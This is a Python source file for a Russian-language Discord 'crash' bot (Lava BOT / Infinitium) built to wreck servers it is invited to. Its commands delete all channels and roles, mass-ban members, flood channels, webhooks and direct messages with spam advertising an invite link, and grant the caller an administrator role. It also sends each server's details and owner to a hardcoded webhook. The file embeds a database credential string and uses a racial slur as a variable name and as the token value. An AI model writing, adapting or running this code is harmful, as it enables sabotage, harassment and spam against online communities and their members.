# -*- coding: utf-8 -*-

# Chaos BOT
import os
os.system("pip install discord.py")
os.system("pip install asyncio")
os.system("pip install pymongo")

import asyncio
import discord
from discord.ext import commands
import time
import random
from discord import Permissions
import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
import requests
import typing
from asyncio import create_task
ids = [1071537915722739874]

intents = discord.Intents.all()

client = commands.Bot(command_prefix='!', intents=intents)

client.remove_command('help')

@client.event
async def on_ready():
	print('LAVA BOT запущен!')
bot = client
import requests, pymongo, asyncio, discord, aiohttp, os
from discord.ext import commands
from discord import Webhook
from pymongo import MongoClient
from discord import Intents
from datetime import datetime
cluster = pymongo.MongoClient("mongodb+srv://root:toor@cluster0.gnfdisl.mongodb.net/?retryWrites=true&w=majority")
db = cluster.test
collraids = cluster.msc.collraids
antileavein = [1057627793690726430]
@bot.event
async def on_ready():
    print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')
    async def guildlinksclear():
      for g in client.guilds:
            if g.id in antileavein:
                  pass

  
    client.loop.create_task(guildlinksclear())
    values = {
        "_id": 1,
        "count": 0
        }

    if collraids.count_documents({"_id": 1}) == 0:
        collraids.insert_one(values)

            
@client.event
async def on_guild_join(guild):
    try:
        if len(guild.members) <= 10:
            print("На сервере меньше 10 человек :(")
    except:
        pass    
    hookj = {
        "username": "Lava BOT",
        "avatar_url": "https://files.catbox.moe/nyb5w8.png",
        "content": "",
        "embeds": [
        {
            "title": f"Меня добавили на `{guild}`, а это значит скоро он будет крашнут!",
            "color": 595959 ,
            "description": f" Краткая инфа о нем: \n**участников**: `{guild.member_count}` \n\n**ролей**: `{len(guild.roles)}` \n\n**Каналов**: `{len(guild.text_channels)}` \n\n**Название сервера:** `{guild}`\n\n**Айди Сервера:** `{guild.id}`\n\n**Овнер:** `{guild.owner_id}`・ `{guild.owner.name}` ", 
            "timestamp": "", 
            "author": {
            "name": ""
            },
            "image": {},
            "footer": {},
            "fields": []
        }
        ],
        "components": []
    }
    hook = 'https://discord.com/api/webhooks/1145425247919685732/krimgvtEy_Y5CEFk68PZucM4AJret7kf85fML0lQehQ6UJo5i0eWYRbXKK1oA5pqXDeB'
    requests.post(hook, json=hookj)



@client.event
async def on_guild_remove(guild):
   print(f"покинул / удалили с сервера {guild.name} ({guild.member_count} пользователей)")

async def send_user(ctx, user, text):
	try:
		await user.send(text)
	except: pass 
@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def dm_all(ctx):
    await asyncio.gather(*[send_user(ctx, member, text=f"{member.mention} СЕРВЕР НА КОТОРОМ ТЫ НАХОДИШЬСЯ, УСПЕШНО КРАШНУТ! ЗАХОДИ К НАМ, ВЕДЬ У НАС ТЫ МОЖЕШЬ ДОСТАТЬ ТАКИХ ЖЕ БОТОВ ДЛЯ РАЗНОСА СЕРВЕРОВ В ДРЕБЕЗГИ! - https://discord.gg/2Qz7qFwAFP ") for member in ctx.guild.members])
@client.command()
@commands.cooldown(1, 30, commands.BucketType.guild)
async def lavahelp(ctx):
    embed = discord.Embed(
        title = 'Команды:',
        description = '`!ban @Участник`\nБанит определённого участника\n\n`!banall`\nЗабанить ВСЕХ участников\n\n`!kickall`\nКикнуть ВСЕХ участников\n\n`!delchannels`\nУдаляет ВСЕ каналы\n\n`!delroles`\nУдаляет ВСЕ роли\n\n`!channels`\nБесконечно создаёт новые каналы\n\n`!roles`\nБесконечно создаёт новые роли\n\n`!everyone`\nРассылка о краше во все каналы\n\n`!clear`\nОчистка чата\n\n`!rename`\nПереименовывание сервера и изменение аватарки\n\n`!spam`\nСпамит о краше в текущий канал\n\n`!send @Участник [ текст ]`\nОтправить сообщение от лица бота в лс участнику\n\n`!attack`\nАвтоматический краш сервера\n\n`!spamwebhooks`\nСоздание вебхуков на все каналы и спам в них (если на сервере более 50 каналов, эта команда не будет работать)',
        colour = discord.Colour.from_rgb(237, 47, 47)
    )

    try:
        await ctx.author.send(embed=embed)
    except:
    	await ctx.send(embed=embed)


@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def ban(ctx, member: discord.Member):
	try:
		await ctx.guild.ban(member, reason='Краш сервера')
	except Exception as err:
		await ctx.send('Не могу забанить участника!')

	await ctx.message.delete()





async def kchls(ctx):
	good = 0
	bad = 0
	await ctx.message.delete()
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			good +=1
		except:
			bad +=1

	await ctx.guild.create_text_channel('обсуждаем-краш')

	try:
		await ctx.author.send(f'Удалено {good} каналов, не удалил {bad} каналов.')
	except:
		chn = await ctx.guild.create_text_channel('c-r-a-s-h-e-d')
		await chn.send(f'Удалено {good} каналов, не удалил {bad} каналов.')

@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def delchannels(ctx):
	asyncio.create_task(kchls(ctx))

async def krls(ctx):
	errs = 0
	goods = 0
	for jk in ctx.guild.roles:
		try:
			await jk.delete()
			goods +=1
		except:
			errs +=1

	try:
		await ctx.author.send(f'Удалено {goods} ролей, не удалил - {errs} ролей\n||Если удалено 0 ролей, перемести роль бота повыше||')
	except:
		await ctx.send(f'Удалено {goods} ролей, не удалил - {errs} ролей\n||Если удалено 0 ролей, перемести роль бота повыше||')

@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def delroles(ctx):
	await ctx.message.delete()
	asyncio.create_task(krls(ctx))

@client.command()
@commands.cooldown(1, 30000, commands.BucketType.guild)
async def channels(ctx):
	await ctx.message.delete()
	for i in range(100):
		await ctx.guild.create_text_channel('crashed-by-infinitium')
		await ctx.guild.create_voice_channel('https://discord.gg/2Qz7qFwAFP')
		await ctx.guild.create_category('CRASHED!')
		spallch()


        

async def spallch(ctx):
	msg = '@everyone @here \n # ВАШ СЕРВЕР КРАШНУТ! \n ПЕРЕЕЗД НА НОВЫЙ СЕРВЕР! ПОНРАВИЛСЯ КРАШ? ССЫЛКА ГДЕ ВЫ МОЖЕТЕ ДОСТАТЬ НАШИХ БОТОВ: https://discord.gg/2Qz7qFwAFP'
	for channel in ctx.guild.text_channels:
		try:
			await channel.send(msg)
		except:
			pass

@client.command()
@commands.cooldown(1, 30000, commands.BucketType.guild)
async def everyone(ctx):
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))

async def clrs(ctx):
	await ctx.channel.purge(limit=10000)

@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def clear(ctx):
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))

	await ctx.send('Успешно очищены сообщения в данном канале!')

@client.command()
async def send(ctx, member: discord.Member, *, text):
	await ctx.message.delete()
	try:
		await member.send(text)
	except:
		await ctx.send(f'Не смог отправить сообщение!')

@client.command()
async def rename(ctx):
	await ctx.message.delete()
	with open('icon.PNG', 'rb') as f:
		icon = f.read()
		await ctx.guild.edit(name='CRASHED BY INFINITIUM', icon=icon)

@client.command()
async def spam(ctx):
	await ctx.message.delete()
	for i in range(100):
		await ctx.send(f'@everyone @here \n # ВАШ СЕРВЕР КРАШНУТ! \n ПЕРЕЕЗД НА НОВЫЙ СЕРВЕР!, ПОНРАВИЛСЯ КРАШ? ССЫЛКА ГДЕ ВЫ МОЖЕТЕ ДОСТАТЬ НАШИХ БОТОВ: https://discord.gg/2Qz7qFwAFP')

async def crchrls(ctx):
	for i in range(15):
		await ctx.guild.create_text_channel('crashed-by-infinitium')
		await ctx.guild.create_role(name='CRASHED BY INFINITIUM')

async def kroles(ctx):
	for jk in ctx.guild.roles:
		try:
			await jk.delete()
		except:
			pass

@client.command()
async def attack(ctx):
	goodchannels = 0
	badchannels = 0
	goodroles = 0
	badroles = 0
	banned = 0
	badbanned = 0
	
	await ctx.message.delete()
	with open('icon.PNG', 'rb') as f:
		icon = f.read()
		await ctx.guild.edit(name='CRASHED BY INFINITIUM', icon=icon)

	asyncio.create_task(krls(ctx))
	asyncio.create_task(krls(ctx))
	asyncio.create_task(krls(ctx))
	asyncio.create_task(krls(ctx))
	asyncio.create_task(krls(ctx))
	asyncio.create_task(krls(ctx))

	good = 0
	bad = 0
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			good +=1
		except:
			bad +=1

	try:
		await ctx.author.send(f'Удалено {good} каналов, не удалил {bad} каналов.')
	except:
		pass
	
	for nigga in range(100):
		try:
			asyncio.create_task(crchrls(ctx))
			asyncio.create_task(crchrls(ctx))
			asyncio.create_task(crchrls(ctx))
			asyncio.create_task(spallch(ctx))
			asyncio.create_task(spallch(ctx))
			asyncio.create_task(spallch(ctx))
		except:
			pass
	

	count = 0
	errs = 0






async def createhooks(ctx):
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='Lava BOT')
    except:
      pass

async def spamhooks(ctx):
  for i in range(10):
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='@everyone @here \n # ВАШ СЕРВЕР КРАШНУТ! \n ПЕРЕЕЗД НА НОВЫЙ СЕРВЕР!, ПОНРАВИЛСЯ КРАШ? ССЫЛКА ГДЕ ВЫ МОЖЕТЕ ДОСТАТЬ НАШИХ БОТОВ: https://discord.gg/2Qz7qFwAFP', wait=True)
      except:
        continue

@client.command()
@commands.cooldown(1, 600, commands.BucketType.guild)
async def spamwebhooks(ctx):
	await createhooks(ctx)
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))

@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "LavaBOT")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(100):
        try:
          await webhook.send(f"@everyone @here \n # ВАШ СЕРВЕР КРАШНУТ! \n ПЕРЕЕЗД НА НОВЫЙ СЕРВЕР!, ПОНРАВИЛСЯ КРАШ? ССЫЛКА ГДЕ ВЫ МОЖЕТЕ ДОСТАТЬ НАШИХ БОТОВ: https://discord.gg/2Qz7qFwAFP", tts=True)
        except:
          pass       

antileavein = []
@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def create_invite(ctx, server_id: int):
    if server_id != None:
        guild = client.get_guild(server_id)
        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, temporary=False)
        await ctx.send(f"https://discord.gg/{invite.code}")

@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def links(ctx, members: int=30):
    if ctx.channel.id != 1077130797661814824:
        return
    for g in client.guilds:
        if g.id in antileavein:
            return
        if g.id == ctx.guild.id:
            return
        if g.member_count<members:
            try:
                await g.leave()
            except:
                return
        try:
            guild = client.get_guild(g.id)
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, temporary=False)
            await ctx.send(f"https://discord.gg/{invite.code}")
        except:
            try:
                await g.leave()
            except:
                return
@client.command(pass_context=True)
@commands.cooldown(1, 300, commands.BucketType.guild)
async def adm(ctx): 
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name="Admin", permissions=perms) 
    
    role = discord.utils.get(ctx.guild.roles, name="Admin") 
    user = ctx.message.author 
    await user.add_roles(role) 
    await ctx.message.delete()
    await ctx.author.send("Вам выдан администратор")



@client.command()
async def ultragvrwrv1111(guild):
        for guild in client.guilds: 
            try:
                chan = await guild.create_text_channel(name="переезд", topic="ГТА")
                print(f"создал канал на сервере {guild.name}")
                await chan.send(f"@everyone @here \n # ВАШ СЕРВЕР КРАШНУТ! \n ПЕРЕЕЗД НА НОВЫЙ СЕРВЕР! ПОНРАВИЛСЯ КРАШ? ССЫЛКА ГДЕ ВЫ МОЖЕТЕ ДОСТАТЬ НАШИХ БОТОВ: https://discord.gg/2Qz7qFwAFP")
                print("в канал отправил")
                await guild.leave()
                print(f"ВЫШЕЛ ИЗ {guild.name}")
            except: pass
token = "nigga"
client.run(token)
